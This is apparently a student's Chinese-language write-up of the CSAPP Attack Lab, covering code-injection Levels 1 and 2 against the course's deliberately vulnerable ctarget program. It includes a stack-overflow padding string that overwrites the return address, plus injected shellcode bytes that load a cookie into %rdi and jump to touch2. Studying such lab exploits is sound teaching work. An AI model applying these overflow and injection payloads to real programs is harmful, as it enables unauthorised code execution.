# 说明

​	该实验主要做的是使用缓冲区溢出来攻击已有代码，包括但不限于：覆盖返回地址，使程序返回时执行我们自己的代码。

​	文件说明：***ctarget***、***rtarget***为我们要攻击的源程序，***hex2raw***是帮助我们将16进制表示转换为字符的程序，***farm.c***也是一个工具程序，***cookie.txt***是用户的cookie值，用于向cmu的服务器发起请求的，***ctarget.txt***是反编译输出的ctaget代码。



# Part I: Code Injection Attacks

​	第一部分，代码注入攻击

## Level 1

​	查看attack的实验指导（本项目中实验指导目录下的attacklab.pdf文档）可以知道，第一个实验要求我们利用栈缓冲区溢出来执行特定的目标代码touch1。

​	我们只需要将栈内存中当前函数的返回地址修改为目标函数的开始地址就可以完成。所以我们需要知道目标函数的开始地址。

​	可以使用objdump工具将ctarget可执行文件反汇编成汇编代码。

> objdump -d ctarget > ctarget.txt

​	执行完成后，查看ctarget.txt文件，可以找到以下代码：

~~~
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
~~~

​	可以看到，touch1函数的开始地址为0x4017c0，现在我们只需要利用源代码当中的漏洞将这个地址覆盖掉程序的返回地址就可以完成第一个目标。

​	我们可以观察题目给出的漏洞代码：

![image-20230226195913939](D:\Project\project_revelant\CSAPP\target1\readme.assets\image-20230226195913939.png)

​	可以看到一上来就将栈指针减少了40字节，这很关键，说明当前程序的返回地址在栈指针+40字节处，所以我们构建的攻击参数需要空出这40字节，以便能够将程序的返回地址覆盖掉。

​	所以我们需要构建的攻击字符串为：

~~~
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40
~~~

​	注意数据需要按照小端法存放，将这个攻击参数放入arg1.txt中，利用hex2raw程序将其转换成对应的字节流，再作为参数传给ctarget。

​	得到最终结果：

![Snipaste_2023-02-16_21-23-41](D:\Project\project_revelant\CSAPP\target1\readme.assets\Snipaste_2023-02-16_21-23-41.png)





## Level2

​	这部分的实验要求是通过注入代码攻击，使得程序能够运行touch2函数。

​	实验指导中给出了touch2函数的c代码：

~~~c
void touch2(unsigned val)
{
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n",val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n",val);
        fail(2);
    }
    exit(0);
}
~~~

​	可以看到，这次要执行的函数还需要携带一个无符号类型的参数，并且还要将这个参数和我们的cookie（在cookie.txt文件中）进行对比，只有相同才算成功。

​	所以我们的攻击要能够将cookie值放入%rdi寄存器中，这是用于存放第一个参数的寄存器。要像Level1那样简单注入一个返回地址可不行了。

​	思路：我们可以将攻击代码注入到栈内存上，然后通过返回地址跳转到注入的代码执行，在注入的代码中将cookie值放入%rdi寄存器，然后跳转到touch2函数执行。

​	查看cookie值为0x59b997fa。

​	touch2的起始地址为0x4017ec：

![image-20230226203332845](D:\Project\project_revelant\CSAPP\target1\readme.assets\image-20230226203332845.png)

​	注入代码为：

~~~
mov $0x59b997fa, %rdi
pushq $0x4017ec
retq
~~~

​	但是需要将汇编代码转换为机器指令，可以通过gcc和objdump工具完成此操作，首先将上述汇编代码放入attack2.s文件中，接着执行以下代码：

~~~shell
gcc -c attack2.s
objdump -d attack2.o > attack2.txt
~~~

​	attack2.txt：

~~~
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq  
~~~
